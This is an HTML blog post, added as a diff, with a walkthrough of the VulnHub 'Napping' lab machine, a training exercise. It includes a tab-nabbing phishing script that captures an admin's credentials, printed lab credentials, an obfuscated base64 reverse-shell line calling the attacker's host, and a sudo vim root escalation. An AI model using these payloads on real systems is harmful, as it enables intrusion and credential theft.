@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>napping 1.0.1 vulnhub writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-06-27-napping/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="napping 1.0.1 vulnhub writeup">
+  <meta property="og:description" content="In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor.
+you can download the machine from here we have the description :
+Even Admins can fall asleep on the job
+it indicates that some admin will make a mistake or something but let’s Jump in and see ourselves.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-06-27T00:45:19+02:00">
+    <meta property="article:modified_time" content="2022-06-27T00:45:19+02:00">
+    <meta property="article:tag" content="Vulnhub">
+    <meta property="article:tag" content="Tab-Nabbing">
+    <meta property="article:tag" content="Phishing">
+    <meta property="article:tag" content="Vim">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="napping 1.0.1 vulnhub writeup">
+  <meta name="twitter:description" content="In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor.
+you can download the machine from here we have the description :
+Even Admins can fall asleep on the job
+it indicates that some admin will make a mistake or something but let’s Jump in and see ourselves.">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-06-27-napping/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-05-21-pandora/" /><link rel="next" href="http://example.org/posts/android-pentesting/2022-07-09-routerspace/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "napping 1.0.1 vulnhub writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-06-27-napping\/"
+        },"genre": "posts","keywords": "Vulnhub, tab-nabbing, phishing, vim","wordcount":  1014 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-06-27-napping\/","datePublished": "2022-06-27T00:45:19+02:00","dateModified": "2022-06-27T00:45:19+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">napping 1.0.1 vulnhub writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-06-27">2022-06-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1014 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#lateral-movement">Lateral movement</a></li>
+    <li><a href="#root-access">root Access</a></li>
+    <li><a href="#after-root">After root</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor.</p>
+<p>you can download the machine from <a href="https://www.vulnhub.com/entry/napping-101,752/" target="_blank" rel="noopener noreffer ">here</a> we have the description :</p>
+<p><em>Even Admins can fall asleep on the job</em></p>
+<p>it indicates that some admin will make a mistake or something but let&rsquo;s Jump in and see ourselves.</p>
+<p>First we need to get the IP of the target machine with :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo netdiscover</span></span></code></pre></div></div>
+<p>and I have got the IP address : <code>192.168.1.12</code> Let&rsquo;s start our process :</p>
+<h2 id="scanning">Scanning</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 192.168.1.12 -oN nmap.inital</span></span></code></pre></div></div>
+<p>results :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0062s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Login
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<p>From the results we know the following :</p>
+<ul>
+<li>the target machine is Ubuntu</li>
+<li>the Apache version running 2.4.41</li>
+<li>httponly flag not set which can lead to XSS (cross site scripting)</li>
+<li>we will get a login page when we visit the page</li>
+</ul>
+<p>Also we can do a full port scanning But with no more results</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Before hopping into the website let&rsquo;s do some basics enumeration from the terminal</p>
+<h4 id="directory-busting-">Directory Busting :</h4>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt  -u http://192.168.1.12/FUZZ -o files-medium.txt -fc <span class="m">403</span></span></span></code></pre></div></div>
+<p>Output :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">config.php              <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php               <span class="o">[</span>Status: 200, Size: 1219, Words: 334, Lines: 38<span class="o">]</span>
+</span></span><span class="line"><span class="cl">logout.php              <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">welcome.php             <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">register.php            <span class="o">[</span>Status: 200, Size: 1566, Words: 434, Lines: 42<span class="o">]</span>
+</span></span><span class="line"><span class="cl">reset-password.php      <span class="o">[</span>Status: 302, Size: 0, Words: 1, Lines: 1<span class="o">]</span></span></span></code></pre></div></div>
+<p>visiting the web page we got a login :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627113927.png"
+        data-srcset="/assets/images/napping/20220627113927.png, /assets/images/napping/20220627113927.png 1.5x, /assets/images/napping/20220627113927.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627113927.png"
+        title="error" /></p>
+<p>Trying some basic SQLi statements But no bypasses. so Let&rsquo;s create an account and see what is going on .</p>
+<p>After logging in we will be redirected to <strong>/welcome.php</strong> which we have found earlier</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627120228.png"
+        data-srcset="/assets/images/napping/20220627120228.png, /assets/images/napping/20220627120228.png 1.5x, /assets/images/napping/20220627120228.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627120228.png"
+        title="error" /></p>
+<p>we can try to go to the <strong>/reset-password.php</strong> maybe we can change the ID or the username if it was being sent with the request to admin and reset his password. But unfortunately we can&rsquo;t :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627120508.png"
+        data-srcset="/assets/images/napping/20220627120508.png, /assets/images/napping/20220627120508.png 1.5x, /assets/images/napping/20220627120508.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627120508.png"
+        title="error" /></p>
+<p>we can see the Enter URL and the admin will check. i have tried some wrappers (file:// and php://) But no results , However with being said admin will review it this should trigger your XSS sense.</p>
+<p>I made an empty html file and host it , then submit the link of my URL and wait to see what will happen and Look :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627124018.png"
+        data-srcset="/assets/images/napping/20220627124018.png, /assets/images/napping/20220627124018.png 1.5x, /assets/images/napping/20220627124018.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627124018.png"
+        title="error" /></p>
+<p>It seems after 2 minutes of submission the url the admin will indeed review it , so we can try to steal any useful data</p>
+<p>However i tried a lot but no thing is getting back.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.giphy.com/assets/images/GlqUe0PhpAHCg/giphy.gif"
+        data-srcset="https://media.giphy.com/assets/images/GlqUe0PhpAHCg/giphy.gif, https://media.giphy.com/assets/images/GlqUe0PhpAHCg/giphy.gif 1.5x, https://media.giphy.com/assets/images/GlqUe0PhpAHCg/giphy.gif 2x"
+        data-sizes="auto"
+        alt="https://media.giphy.com/assets/images/GlqUe0PhpAHCg/giphy.gif"
+        title="x" /></p>
+<p>Let&rsquo;s check the Page source code , we can see this weird target value <code>_blank</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627130623.png"
+        data-srcset="/assets/images/napping/20220627130623.png, /assets/images/napping/20220627130623.png 1.5x, /assets/images/napping/20220627130623.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627130623.png"
+        title="error" /></p>
+<p>Searching for it found it is actually a <a href="https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/" target="_blank" rel="noopener noreffer ">vulnerability</a> can open phishing scenarios , and we know the admin will visit this fake page , also from description we know even admin may made mistake so let&rsquo;s clone the login page (copy html code) our hope is the admin to submit his username and password</p>
+<h2 id="foothold">Foothold</h2>
+<p>Following the Article steps :</p>
+<p>1- clone the Login page source code</p>
+<p>2- add the following in the source code which the data will be redirected to</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.1.11:9090&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<p><em>note: add other port rather than the http port because it is a POST request so the data submitted will not appear at the uri in the http server</em></p>
+<p>3- Host the page and submit the URL</p>
+<p>and after 2 minutes we got the Juicy stuff :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627134313.png"
+        data-srcset="/assets/images/napping/20220627134313.png, /assets/images/napping/20220627134313.png 1.5x, /assets/images/napping/20220627134313.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627134313.png"
+        title="error" /></p>
+<p>now we have this credentials after URL decoding
+<code>daniel:C@ughtm3napping123</code></p>
+<p>Trying these credentials in the web page we got invalid login , trying them with the <strong>ssh</strong> port we have found earlier we are in finally</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627134759.png"
+        data-srcset="/assets/images/napping/20220627134759.png, /assets/images/napping/20220627134759.png 1.5x, /assets/images/napping/20220627134759.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627134759.png"
+        title="error" /></p>
+<h2 id="lateral-movement">Lateral movement</h2>
+<p>First thing that have my attention is the <strong>administrators</strong> group , so let&rsquo;s check what is interesting about this group</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">daniel@napping:~$ find / -group administrators  2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/home/adrian/query.py
+</span></span><span class="line"><span class="cl">daniel@napping:~$ ls -l /home/adrian/query.py
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> adrian administrators <span class="m">481</span> Oct <span class="m">30</span>  <span class="m">2021</span> /home/adrian/query.py</span></span></code></pre></div></div>
+<p>nice we have write access to that folder , we can edit it but then what ? , we need also user adrian to execute it and there should be some crontab running to achieve that.</p>
+<p>However there is no crontabs under the <code>/etc/crontab</code> , there are other cornjobs that are under <code>/var/spool/cron</code> and normally only the user who owns it will be able to access it.</p>
+<p>we can upload <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreffer ">pspy</a> and monitor the processes running and check for such a cron job</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627141335.png"
+        data-srcset="/assets/images/napping/20220627141335.png, /assets/images/napping/20220627141335.png 1.5x, /assets/images/napping/20220627141335.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627141335.png"
+        title="error" /></p>
+<p>and guess who is the User whose id is 1000 ?</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">daniel@napping:/tmp$ cat /etc/passwd <span class="p">|</span> grep adrian
+</span></span><span class="line"><span class="cl">adrian:x:1000:1000:adrian:/home/adrian:/bin/bash</span></span></code></pre></div></div>
+<p>so we can simply add our malicious piece of code in the script running by adrian and we will get a reverse shell :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">os.system<span class="o">(</span><span class="s2">&#34;echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExLzg4ODggMD4mMQ== | base64 -d | bash&#34;</span><span class="o">)</span></span></span></code></pre></div></div>
+<p><em>note we need to base64 encode the reverse shell payload as it contains some special characters will disturb the execution</em></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627142623.png"
+        data-srcset="/assets/images/napping/20220627142623.png, /assets/images/napping/20220627142623.png 1.5x, /assets/images/napping/20220627142623.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627142623.png"
+        title="error" /></p>
+<h2 id="root-access">root Access</h2>
+<p>and the root part is really easy :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627142726.png"
+        data-srcset="/assets/images/napping/20220627142726.png, /assets/images/napping/20220627142726.png 1.5x, /assets/images/napping/20220627142726.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627142726.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/vim
+</span></span><span class="line"><span class="cl"><span class="c1"># press ESC then</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627142856.png"
+        data-srcset="/assets/images/napping/20220627142856.png, /assets/images/napping/20220627142856.png 1.5x, /assets/images/napping/20220627142856.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627142856.png"
+        title="error" /></p>
+<p>And the machine has been pwned ;)</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/napping/20220627142914.png"
+        data-srcset="/assets/images/napping/20220627142914.png, /assets/images/napping/20220627142914.png 1.5x, /assets/images/napping/20220627142914.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/napping/20220627142914.png"
+        title="error" /></p>
+<h2 id="after-root">After root</h2>
+<p>Under <code> /var/spool/cron/crontabs/adrian</code> we can see</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*/2 * * * * /usr/bin/python3 /home/adrian/query.py</span></span></code></pre></div></div>
+<p>and under <code> /var/spool/cron/crontabs/root</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*/2 * * * * /usr/bin/python3 /root/nap.py</span></span></code></pre></div></div>
+<p>The script was checking for the opener.location in the page the admin visit and if present it will submit the data</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;daniel&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;C@ughtm3napping123&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="p">(</span><span class="n">search</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;opener.location&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;http(.*);&#34;</span><span class="p">,</span><span class="n">search</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_url</span> <span class="o">=</span> <span class="s1">&#39;http&#39;</span> <span class="o">+</span> <span class="k">match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="k">match</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">new_url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span></span></span></code></pre></div></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-06-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
